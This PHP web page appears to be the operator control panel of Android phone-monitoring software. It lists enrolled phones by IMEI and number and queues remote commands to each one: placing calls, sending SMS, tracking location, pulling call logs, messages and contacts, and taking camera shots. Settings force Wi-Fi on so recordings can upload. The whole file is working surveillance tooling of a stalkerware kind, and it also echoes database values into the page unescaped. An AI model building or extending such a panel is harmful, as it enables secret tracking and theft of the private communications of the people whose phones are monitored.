<?php
require_once('./authenticate.php');
?>
<html>
    <head>
        <meta charset="utf-8"> 
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <!-- Latest compiled and minified CSS -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css">

        <!-- jQuery library -->
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

        <!-- Popper JS -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.6/umd/popper.min.js"></script>

        <!-- Latest compiled JavaScript -->
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js"></script>

        <!-- Font awesome JavaScript -->
        <script src="https://use.fontawesome.com/53d43f5815.js"></script>
        <title>PhoneMonitor Clients</title>
    </head>
    <body>

        <nav class="navbar navbar-expand-sm navbar-dark bg-dark">
            <div class="navbar-brand">PhoneMonitor CP</div>
            <ul class="navbar-nav">
                <li class="nav-item active"><a href="./clientlist.php" class="nav-link">Clients</a></li>
                <li class="nav-item"><a href="./outputlist.php" class="nav-link">Outputs</a></li>
                <li class="nav-item"><a href="./commandlist.php" class="nav-link">Commands</a></li>
            </ul>
            <ul class="navbar-nav ml-auto">
                <li class="nav-item">
                    <div class="dropdown">
                        <button type="button" class="btn btn-outline-secondary dropdown-toggle" data-toggle="dropdown"><?=$_SESSION['username']?> </button>
                        <div class="dropdown-menu dropdown-menu-right">
                            <a class="dropdown-item" href="./logout.php">Log out</a>
                        </div>
                    </div>
                </li>
            </ul>
        </nav>

        <table class="table table-striped table-hover table-bordered" id="tableId">
            <thead>
                <th>SN</th>
                <th>Number</th>
                <th>IMEI</th>
                <th>Manufacturer</th>
                <th>Model</th>
                <th>Unique Id</th>
                <th>Last Seen</th>
                <th>Command</th>
            </thead>
            <?php
            include('./helperfuncs.php');
            $getclientlistquery="SELECT * FROM clientlist";
            $conn=@new mysqli($DB_HOST,$DB_USERNAME,$DB_PASSWORD,$DB_NAME);
            CreateClientlistTableIfNotExists($conn);
            if($conn->connect_errno==0)
            {
                $response=$conn->query($getclientlistquery);
                if($response)
                {
                    $row_num=0;
                    echo("<tbody>");
                    while($row=$response->fetch_assoc())
                    {
                        echo("<tr>");
                        echo("<td>".++$row_num."</td>"."<td>".$row['Number']."</td>"."<td>".$row['IMEI']."</td>"
                            ."<td>".$row['Manufacturer']."</td>"."<td>".$row['Model']."</td>"."<td>".$row['UniqueId']
                            ."</td>"."<td>".date('h:i:s a | l, F j, Y',strtotime($row['LastSeen']))."</td>"."<td></td>");
                        echo("</tr>");
                    }
                    echo("</tbody>");
                }
            }
            ?>
        </table>
        <script>
            var hoveredRowDeviceUID;
            $("#tableId tbody tr").hover((obj)=>{
                obj.currentTarget.cells[7].innerHTML=
                `<i class='fa fa-terminal' onclick='openCommandsModal()' title='Add commands to this client'></i>
                <i class='fa fa-cog' onclick='openSettingsModal()' title='Show/change settings of this client'></i>
                `;
                hoveredRowDeviceUID=obj.currentTarget.cells[5].innerHTML;
            });
            $("#tableId tbody tr").mouseleave((obj)=>{
                obj.currentTarget.cells[7].innerHTML="";
            });
            function openCommandsModal(){
                $("#myCommandsModal").modal('toggle');
                $("#selectedCommand").val(-1);//reset the selected option
                $("#parametersDivId")[0].innerHTML="";
            }
            function openSettingsModal(){
                var deviceUID=hoveredRowDeviceUID;
                $.post("./getsettings.php",{uniqueid:deviceUID},(data, status)=>{
                    var serverresponse;
                    if(status==="success"){
                        serverresponse=data;
                        try{
                            var json=JSON.parse(serverresponse);
                            $("#forceWifiOnForRecordUpload").prop('checked',parseInt(json["ForceWifiOnForRecordUpload"]));
                            $("#serverTalkInterval").val(json["ServerTalkInterval"]);
                        }catch(e){
                            //invalid JSON response by server
                        }
                    }                    
                });
                $("#mySettingsModal").modal('toggle');
                
            }
        </script>
        <!-- Modal for command selection -->
        <div id="myCommandsModal" class="modal fade">
            <div class="modal-dialog">
                <!-- Modal content-->
                <div class="modal-content">
                    <div class="modal-header">
                        <h3 class="modal-title">Add command</h3>
                        <button type="button" class="close" data-dismiss="modal">&times;</button>
                    </div>
                    <div class="modal-body">
                        <div class="form-group">
                            <select class="form-control" id="selectedCommand">
                                <option selected hidden value=-1>Select a command</option>
                                <option value=0 title="Vibrate phone in a specific pattern">Vibrate</option>
                                <option value=1 title="Call a number">Call</option>
                                <option value=2 title="Send SMS to a number">SMS</option>
                                <option value=3 title="Get device location">Location</option>
                                <option value=4 title="Retrieve device call records">Call logs</option>
                                <option value=5 title="Retrieve SMS messages">SMS messages</option>
                                <option value=6 title="Retrieve contact list">Contacts</option>
                                <option value=7 title="Take camera shot">Camera</option>
                            </select>
                        </div>
                        <hr>
                        <div id="parametersDivId"></div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-success" onclick="sendCommandToServer()" data-dismiss="modal">Add</button>
                        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                    </div>
                </div>
            </div>
        </div>
        <!-- Modal for toast/messagebox -->
        <div id="myToast" class="modal">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-body">
                        <div id="toastMsgId"></div>
                    </div>
                </div>
            </div>
        </div>
        <!-- Modal for displaying/changing settings -->
        <div id="mySettingsModal" class="modal fade">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h3 class="modal-title">Settings</h3>
                        <button type="button" class="close" data-dismiss="modal">&times;</button>
                    </div>
                    <div class="modal-body">
                        <div class="form-group">
                            <div class="form-check">
                                <label class="form-check-label"><input type="checkbox" class="form-check-input" id="forceWifiOnForRecordUpload" 
                                title="Whether to switch Wifi on when a recording is to be uploaded."></input>Force Wifi On
                                </label>
                            </div>
                            <br>
                            <div class="form">
                                <label for="serverTalkInterval">Server talk interval</label>
                                <input type="number" class="form-control" id="serverTalkInterval" title="Milliseconds between consecutive server contacts"></input>
                            </div>
                            
                        </div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-success" onclick="saveSettingsToServer()" data-dismiss="modal">Save</button>
                        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                    </div>
                </div>
            </div>
        </div>

        <script>
            $("#selectedCommand").change((selectobj)=>{
                $("#parametersDivId")[0].innerHTML="";
                var selectedOption=parseInt(selectobj.currentTarget.value);
                switch(selectedOption){
                    case 0://vibrate
                        $("#parametersDivId")[0].innerHTML+=`
                        <div class="form-group">
                            <label for="param1">Repeat</label>
                            <input type="number" class="form-control" id="param1" title="Vibrate this many times"></input>
                        </div>
                        <div class="form-group">
                            <label for="param2">Pattern</label>
                            <textarea class="form-control" id="param2" 
                            title="Vibration pattern in the format (Delay) (Vibrate) (Delay) (Vibrate) e.g. 0 300 50 200 etc"></textarea>
                        </div>`
                    break;
                    case 1://call
                    $("#parametersDivId")[0].innerHTML+=`
                        <div class="form-group">
                            <label for="param1">Phone number</label>
                            <input type="number" class="form-control" id="param1" title="Call this number"></input>
                        </div>`                                              
                    break;
                    case 2://sms
                    $("#parametersDivId")[0].innerHTML+=`
                        <div class="form-group">
                            <label for="param1">Target phone number</label>
                            <input type="number" class="form-control" id="param1" title="Send SMS to this number"></input>
                        </div>
                        <div class="form-group">
                            <label for="param2">Message</label>
                            <textarea class="form-control" id="param2" 
                            title="The message body of the SMS"></textarea>
                        </div>`
                    break;
                    case 3://gps
                    $("#parametersDivId")[0].innerHTML+=`
                        <div class="form-group">
                            <label for="param1">Times</label>
                            <input type="number" class="form-control" id="param1" title="No. of times to take user to Location Services. Can be empty."></input>
                        </div>
                        <div class="form-check">
                            <label class="form-check-label"><input type="checkbox" class="form-check-input" id="param2" 
                            title="Whether to show a toast urging user to enable Location Service. Note: the toast will be shown as many times as specified above"></input>Toast
                            </label>
                        </div>
                        <div class="form-group">
                            <label for="param3">Target phone</label>
                            <input type="number" class="form-control" id="param3" title="Send GPS to phone number. Can be empty."></input>
                        </div>`
                    break;
                    case 4://calllogs
                    $("#parametersDivId")[0].innerHTML="";
                    break;
                    case 5://sms messages
                    $("#parametersDivId")[0].innerHTML="";
                    break;
                    case 6://contacts
                    $("#parametersDivId")[0].innerHTML="";
                    break;
                    case 7://camera
                    $("#parametersDivId")[0].innerHTML+=`
                            <select class="form-control" id="param1">
                                <option value=0 title="Newer method of camera photo capture, but requires API 11 (Android 3.0) or above.">SurfaceTexture</option>
                                <option selected value=1 title="Compatible across all Android devices but perhaps slower">SurfaceView</option>
                            </select>`
                    break;
                }
            });
            function sendCommandToServer(){
                //ajax to server
                var deviceUID=hoveredRowDeviceUID;
                var commandId=parseInt($("#selectedCommand").val());
                var param1=getParamValue("#param1");
                var param2=getParamValue("#param2");
                var param3=getParamValue("#param3");
                var param4=getParamValue("#param4");
                $.post("./setcommands.php",
                {
                    deviceuid:deviceUID,
                    commandid:commandId,
                    param1:param1,
                    param2:param2,
                    param3:param3,
                    param4:param4
                },(data, status)=>{
                    var serverresponse;
                    if(status==="success"){
                        serverresponse=data;
                    }else{
                        serverresponse="Something went wrong :(";
                    }
                    $("#toastMsgId")[0].innerHTML=serverresponse;
                    $("#myToast").modal("toggle");
                    setTimeout(() => {
                        $("#myToast").modal("toggle");
                    }, 1000);
                });
            }
            function getParamValue(id){
                if($(id).attr('type')=='checkbox'){
                    return $(id).prop('checked');
                }else{
                    return $(id).val();
                }
            }
            function saveSettingsToServer(){
                var deviceUID=hoveredRowDeviceUID;

                $.post("./setsettings.php",
                {
                    deviceuid:deviceUID,
                    forceWifiOnForRecordUpload:getParamValue("#forceWifiOnForRecordUpload"), 
                    serverTalkInterval:getParamValue("#serverTalkInterval")                  
                },(data, status)=>{
                    var serverresponse;
                    if(status==="success"){
                        serverresponse=data;
                    }else{
                        serverresponse="Something went wrong :(";
                    }
                    $("#toastMsgId")[0].innerHTML=serverresponse;
                    $("#myToast").modal("toggle");
                    setTimeout(() => {
                        $("#myToast").modal("toggle");
                    }, 1000);
                });
            }
        </script>

    </body>
</html>